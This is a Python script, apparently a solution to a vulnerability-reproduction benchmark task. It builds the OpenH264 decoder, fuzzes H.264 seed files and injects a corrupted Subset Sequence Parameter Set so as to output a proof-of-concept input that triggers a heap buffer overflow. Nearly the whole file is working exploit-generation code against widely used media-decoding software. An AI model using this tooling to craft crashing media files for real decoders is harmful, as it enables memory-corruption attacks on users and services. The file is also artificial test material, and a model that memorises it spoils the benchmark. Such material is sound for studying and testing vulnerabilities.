import os
import sys
import subprocess
import tempfile
import shutil
import tarfile
import random
import glob
import time

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the heap buffer overflow vulnerability in svcdec/OpenH264.
        
        Strategies:
        1. Extract the source code and build the decoder (h264dec).
        2. Identify seed files from the source (looking for .264 files).
        3. Use a fuzzing loop to mutate seeds, specifically targeting the creation or modification 
           of Subset Sequence Parameter Sets (NAL unit type 15) to trigger the dimension mismatch.
        4. If a crash is found, return that PoC.
        5. If build fails or no crash found, return a deterministically constructed candidate.
        """
        base_wd = os.getcwd()
        temp_dir = tempfile.mkdtemp()
        
        try:
            # 1. Extract Source Code
            try:
                with tarfile.open(src_path) as tar:
                    tar.extractall(path=temp_dir)
            except Exception:
                pass
            
            source_root = temp_dir
            entries = os.listdir(temp_dir)
            if len(entries) == 1 and os.path.isdir(os.path.join(temp_dir, entries[0])):
                source_root = os.path.join(temp_dir, entries[0])
            
            # 2. Attempt to Build OpenH264
            decoder_bin = None
            try:
                # Standard OpenH264 build command
                # We silence output to adhere to strict output requirements if any, but mainly to keep logs clean
                subprocess.check_call(["make", "-j8", "OS=linux"], cwd=source_root, 
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception:
                # Build might fail if dependencies (like nasm) are missing
                pass

            # Locate the compiled binary
            candidates = [
                "h264dec",
                "codec/console/dec/h264dec",
                "bin/h264dec",
                "h264dec.exe"
            ]
            for c in candidates:
                p = os.path.join(source_root, c)
                if os.path.exists(p) and os.access(p, os.X_OK):
                    decoder_bin = p
                    break
            
            # 3. Gather Seeds
            seeds = []
            for root, dirs, files in os.walk(source_root):
                for f in files:
                    if f.endswith(".264") or f.endswith(".h264") or f.endswith(".jsv"):
                        seeds.append(os.path.join(root, f))
            
            # Fallback minimal seed if no seeds found in tarball
            fallback_seed = (
                b'\x00\x00\x00\x01\x67\x42\x00\x1e\x95\xa0\x14\x01\x6e\x40'
                b'\x00\x00\x00\x01\x68\xce\x3c\x80'
                b'\x00\x00\x00\x01\x65\xb8\x00\x04\x00\x00\x03\x00\x40\x00\x00\x0c\x83\xc6\x0c\xa8'
            )
            
            if not seeds:
                s_p = os.path.join(temp_dir, "seed.264")
                with open(s_p, "wb") as f:
                    f.write(fallback_seed)
                seeds.append(s_p)

            # 4. Fuzzing Loop
            if decoder_bin:
                start_time = time.time()
                timeout = 100  # Time limit for fuzzing
                
                # Prioritize seeds that already have SVC extensions (NAL type 15)
                prioritized_seeds = [s for s in seeds if self._has_nal_type(s, 15)]
                target_seeds = prioritized_seeds if prioritized_seeds else seeds
                
                # Limit number of seeds to try
                target_seeds = target_seeds[:5]
                
                best_poc = None
                out_yuv = os.path.join(temp_dir, "out.yuv")
                
                iterations = 0
                while time.time() - start_time < timeout:
                    seed_path = random.choice(target_seeds)
                    try:
                        with open(seed_path, "rb") as f:
                            seed_data = f.read()
                    except:
                        continue
                    
                    mutated_data = self._mutate(seed_data)
                    
                    test_file = os.path.join(temp_dir, f"fuzz_{iterations}.264")
                    with open(test_file, "wb") as f:
                        f.write(mutated_data)
                        
                    # Execute decoder
                    try:
                        # h264dec usage: ./h264dec input output
                        ret = subprocess.call([decoder_bin, test_file, out_yuv], 
                                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                              timeout=1)
                        # Negative return code implies signal (crash)
                        if ret < 0:
                            best_poc = mutated_data
                            break
                        # Optionally check for specific sanitizer error codes if known, but crash is safest bet
                    except subprocess.TimeoutExpired:
                        pass
                    except Exception:
                        pass
                    finally:
                        if os.path.exists(test_file):
                            os.remove(test_file)
                    
                    iterations += 1
                    if iterations > 3000: break
                
                if best_poc:
                    return best_poc

            # 5. Fallback Construction
            # If fuzzing didn't yield a crash or build failed, we construct a PoC 
            # by injecting a modified Subset SPS into the first available seed.
            if seeds:
                with open(seeds[0], "rb") as f:
                    return self._inject_subset_sps(f.read())
            
            return self._inject_subset_sps(fallback_seed)

        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)

    def _has_nal_type(self, path: str, type_id: int) -> bool:
        try:
            with open(path, "rb") as f:
                # Read start of file
                data = f.read(4096)
            pos = 0
            while True:
                pos = data.find(b'\x00\x00\x01', pos)
                if pos == -1: return False
                if pos + 3 < len(data):
                    if (data[pos+3] & 0x1F) == type_id:
                        return True
                pos += 3
        except:
            return False
        return False

    def _mutate(self, data: bytes) -> bytes:
        arr = bytearray(data)
        
        # Chance to inject Subset SPS if not present or just randomly
        if random.random() < 0.4:
            return self._inject_subset_sps(data)

        # Locate NALs
        locs = []
        pos = 0
        while True:
            pos = data.find(b'\x00\x00\x01', pos)
            if pos == -1: break
            locs.append(pos)
            pos += 3
            
        if not locs: return data

        # Select a NAL to mutate
        target_idx = random.choice(locs)
        
        # Find end of NAL
        end_idx = len(arr)
        for l in locs:
            if l > target_idx:
                end_idx = l
                break
        
        # Mutate payload (skip header byte at offset 3)
        start_payload = target_idx + 4
        length = end_idx - start_payload
        
        if length > 0:
            # Corrupt a few bytes
            for _ in range(random.randint(1, 5)):
                mut_pos = start_payload + random.randint(0, length - 1)
                arr[mut_pos] ^= random.randint(1, 255)
                
        return bytes(arr)

    def _inject_subset_sps(self, data: bytes) -> bytes:
        arr = bytearray(data)
        # Find Base Layer SPS (Type 7)
        pos = 0
        sps_start = -1
        while True:
            pos = data.find(b'\x00\x00\x01', pos)
            if pos == -1: break
            if pos + 3 < len(data) and (data[pos+3] & 0x1F) == 7:
                sps_start = pos
                break
            pos += 3
        
        if sps_start == -1: return data
        
        # Find end of SPS
        sps_end = data.find(b'\x00\x00\x01', sps_start + 3)
        if sps_end == -1: sps_end = len(data)
        
        # Clone SPS
        sps_block = arr[sps_start:sps_end]
        subset_sps = bytearray(sps_block)
        
        # Modify header to Type 15 (Subset SPS)
        # NAL header is at offset 3 relative to 00 00 01
        if len(subset_sps) > 4:
            subset_sps[3] = (subset_sps[3] & 0xE0) | 15
            
            # Modify dimensions to trigger mismatch
            # We blindly corrupt bytes in the middle of the payload where width/height usually reside
            # For a typical SPS, payload size is small (20-40 bytes).
            # Width/Height are usually around bytes 10-15 of the payload.
            if len(subset_sps) > 15:
                # Corrupt bytes 12 and 13
                subset_sps[12] ^= 0xFF
                subset_sps[13] ^= 0x55
            elif len(subset_sps) > 8:
                 subset_sps[8] ^= 0xFF

        # Insert Subset SPS immediately after SPS
        new_data = arr[:sps_end] + subset_sps + arr[sps_end:]
        return bytes(new_data)